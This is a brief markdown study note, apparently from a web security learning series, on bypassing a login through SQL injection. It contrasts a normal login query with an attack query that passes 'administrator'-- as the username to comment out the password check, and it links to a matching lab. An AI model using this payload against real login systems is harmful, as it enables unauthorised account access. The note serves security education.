# Subverting application logic

# Application Query

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

# Attack Query

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose username is `administrator` and successfully logs the attacker in as that user.

# Lab

[**Lab: SQL injection vulnerability allowing login bypass**](./lab-sql-injection-vulnerability-allowing-login-bypass.md)

